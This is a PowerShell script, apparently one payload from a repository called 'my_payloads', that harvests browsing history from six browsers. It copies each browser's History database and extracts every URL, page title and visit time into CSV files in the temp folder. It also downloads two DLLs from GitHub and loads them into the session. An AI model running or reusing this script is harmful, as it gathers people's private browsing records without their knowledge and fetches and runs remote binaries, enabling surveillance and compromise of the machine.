# Define browser paths
$BrowserHistoryPaths = @{
    "Google_Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    "Microsoft_Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
    "Brave"          = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\History"
    "Opera"          = "$env:APPDATA\Opera Software\Opera Stable\History"
    "Vivaldi"        = "$env:LOCALAPPDATA\Vivaldi\User Data\Default\History"
    "Firefox"        = "$env:APPDATA\Mozilla\Firefox\Profiles"
}

# SQLite DLL Paths
$SQLiteDllPath = "$env:TEMP\System.Data.SQLite.dll"
$SQLiteInteropPath = "$env:TEMP\SQLite.Interop.dll"

# Download SQLite DLLs if missing
if (-not (Test-Path $SQLiteDllPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Data.SQLite.dll" -outfile $SQLiteDllPath
}
if (-not (Test-Path $SQLiteInteropPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/SQLite.Interop.dll" -outfile $SQLiteInteropPath
}

# Load SQLite Assembly
Add-Type -Path $SQLiteDllPath

# Iterate through detected browsers
foreach ($Browser in $BrowserHistoryPaths.Keys) {
    $HistoryDB = $BrowserHistoryPaths[$Browser]

    if (Test-Path $HistoryDB) {
        # Create a temporary copy to avoid file lock issues
        $TempDB = "$env:TEMP\${Browser}_History.db"
        Copy-Item -Path $HistoryDB -Destination $TempDB -Force

        # SQLite query to extract full browsing history
        $Query = "SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') AS last_visited FROM urls ORDER BY last_visit_time DESC"

        # Connect to SQLite database
        $Connection = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$TempDB;Version=3;"
        $Connection.Open()

        # Execute query
        $Command = $Connection.CreateCommand()
        $Command.CommandText = $Query
        $Reader = $Command.ExecuteReader()

        # Store history
        $History = @()
        while ($Reader.Read()) {
            $History += [PSCustomObject]@{
                URL         = $Reader["url"]
                Title       = $Reader["title"]
                LastVisited = $Reader["last_visited"]
            }
        }

        # Close connection
        $Reader.Close()
        $Connection.Close()

	Write-Output "Browsing History from ${Browser}:"
	$History | Format-Table -AutoSize

        # Save history to CSV
        $CsvPath = "$env:TEMP\$Browser-History.csv"
        $History | Export-Csv -Path $CsvPath -NoTypeInformation

        # Output result
        Write-Output "History saved: $CsvPath"

	Start-Sleep -seconds 5
        # Cleanup temp files
        Remove-Item -Path $TempDB -Force
    }else{
    	Write-Output "The ${Browser} history file has not been found."
    }
}
